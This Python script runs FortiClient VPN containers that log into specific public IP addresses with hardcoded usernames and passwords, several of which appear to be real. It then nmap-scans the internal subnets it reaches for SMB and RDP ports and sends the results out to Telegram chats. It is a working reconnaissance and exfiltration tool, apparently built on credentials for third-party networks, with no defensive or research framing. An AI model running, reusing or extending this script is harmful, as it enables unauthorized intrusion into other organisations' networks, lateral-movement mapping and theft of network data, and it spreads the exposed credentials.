import requests
import subprocess
import time
import logging
import xmltodict
import json

# Constants
DOCKER_IMAGE = "auchandirect/forticlient"
TELEGRAM_API_KEY = "Your_Telegram_API_Key_Here"  # Replace with actual API key
CHAT_IDS = ["123456789", "987654321"]  # Replace with actual Telegram chat IDs

# Container Configuration
CONTAINERS = [
    {"name": "98.191.254.250", "ip": "172.20.5.224", "user": "msadmin", "vpnaddr": "98.191.254.250:443", "pass": "F@stB@ll!-p2k"},
    {"name": "98.4.177.199", "ip": "172.20.5.225", "user": "JoeS", "vpnaddr": "98.4.177.199:4443", "pass": "05!NodoT!1129"},
    # Add more containers as needed
]

# Logging Configuration
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("container_management.log")
    ]
)

# Helper Functions
def send_to_telegram(message):
    """Send a message to all configured Telegram chats."""
    url = f"https://api.telegram.org/bot{TELEGRAM_API_KEY}/sendMessage"
    for chat_id in CHAT_IDS:
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()
            logging.info(f"Message sent successfully to chat {chat_id}.")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error sending message to Telegram chat {chat_id}: {e}")

def send_file_to_telegram(file_path):
    """Send a file to all configured Telegram chats."""
    url = f"https://api.telegram.org/bot{TELEGRAM_API_KEY}/sendDocument"
    for chat_id in CHAT_IDS:
        try:
            with open(file_path, "rb") as file:
                response = requests.post(url, data={"chat_id": chat_id}, files={"document": file})
                response.raise_for_status()
                logging.info(f"File {file_path} sent successfully to chat {chat_id}.")
        except Exception as e:
            logging.error(f"Failed to send file {file_path} to chat {chat_id}: {e}")

def stop_all_containers():
    """Stop and remove all running Docker containers."""
    try:
        # Stop all running containers
        subprocess.run(["docker", "stop", "$(docker ps -q)"], shell=True, check=True)
        logging.info("All running containers stopped.")

        # Remove all stopped containers
        subprocess.run(["docker", "rm", "$(docker ps -aq)"], shell=True, check=True)
        logging.info("All stopped containers removed.")

        # Prune unused Docker resources
        subprocess.run(["docker", "system", "prune", "-f"], check=True)
        logging.info("Unused Docker resources pruned.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error during Docker cleanup: {e}")

def run_container(container):
    """Run Docker container with specified parameters."""
    try:
        subprocess.run(["docker", "stop", container["name"]], check=True)
        subprocess.run(["docker", "rm", container["name"]], check=True)
        logging.info(f"Removed existing container {container['name']}.")
    except subprocess.CalledProcessError:
        logging.warning(f"No existing container to remove {container['name']}.")

    cmd = [
        "docker", "run", "-d", "--name", container["name"],
        "--cap-add=NET_ADMIN", "--cap-add=SYS_MODULE", "--privileged",
        "--net", "forti", "--ip", container["ip"],
        "-e", f"VPNADDR={container['vpnaddr']}",
        "-e", f"VPNUSER={container['user']}",
        "-e", f"VPNPASS={container['pass']}", "-e", "VPNTIMEOUT=60",
        DOCKER_IMAGE
    ]
    try:
        subprocess.run(cmd, check=True)
        logging.info(f"Container {container['name']} started successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error starting container {container['name']}: {e}")

def check_interface_exists(container_name, interface_name="ppp0"):
    """Check if a specific interface exists in the container."""
    result = subprocess.run(
        ["docker", "exec", container_name, "ip", "link", "show", interface_name],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    exists = interface_name in result.stdout
    logging.info(f"Interface {interface_name} {'exists' if exists else 'not found'} in container {container_name}.")
    return exists

def get_routing_table(container_name):
    """Get the routing table from a container."""
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "ip", "route"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        logging.error(f"Error getting routing table for {container_name}: {e}")
        return None

def get_interface_cidr(container_name):
    """Get all CIDRs for interface ppp0 in the container."""
    if not check_interface_exists(container_name):
        logging.warning(f"Interface ppp0 not found in container {container_name}.")
        return []

    routing_table = get_routing_table(container_name)
    if routing_table:
        return [line.split()[0] for line in routing_table.splitlines() if "ppp0" in line]
    return []

def install_nmap(container_name):
    """Install nmap inside the container."""
    try:
        subprocess.run(["docker", "exec", container_name, "apt-get", "update"], check=True)
        subprocess.run(["docker", "exec", container_name, "apt-get", "install", "-y", "nmap"], check=True)
        logging.info(f"nmap installed successfully in {container_name}.")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error installing nmap in {container_name}: {e}")
        return False

def perform_nmap_scan(container, cidr):
    """Perform Nmap scan on the given CIDR."""
    try:
        scan_args = f"-sV -T5 -p 445,139,3389 --open"
        cmd = f"docker exec {container['name']} nmap {scan_args} {cidr} -oX -"
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode != 0:
            raise Exception(f"Error during Nmap scan: {result.stderr}")

        # Parse and save results
        nmap_results = xmltodict.parse(result.stdout)
        file_path = f"nmap_results_{container['name']}_{cidr.replace('/', '_')}.json"
        with open(file_path, "w") as file:
            file.write(json.dumps(nmap_results, indent=4))

        send_file_to_telegram(file_path)
    except Exception as e:
        logging.error(f"Error during Nmap scan for {container['name']} on CIDR {cidr}: {e}")
        send_to_telegram(f"Nmap scan failed for {container['name']} on CIDR {cidr}: {e}")

def process_container(container):
    """Start container, install tools, and perform network scans."""
    run_container(container)
    time.sleep(20)  # Allow time for the container to initialize

    cidrs = get_interface_cidr(container["name"])
    if cidrs:
        if install_nmap(container["name"]):
            for cidr in cidrs:
                if "/" in cidr:
                    perform_nmap_scan(container, cidr)
                else:
                    logging.warning(f"Invalid CIDR for {container['name']}: {cidr}")
                    send_to_telegram(f"Invalid CIDR for {container['name']}: {cidr}")
    else:
        logging.warning(f"No CIDRs found for {container['name']}.")
        send_to_telegram(f"No CIDRs found for {container['name']}.")

# Main Execution
def main():
    stop_all_containers()  # Clean up all containers before starting
    for container in CONTAINERS:
        process_container(container)

if __name__ == "__main__":
    main()
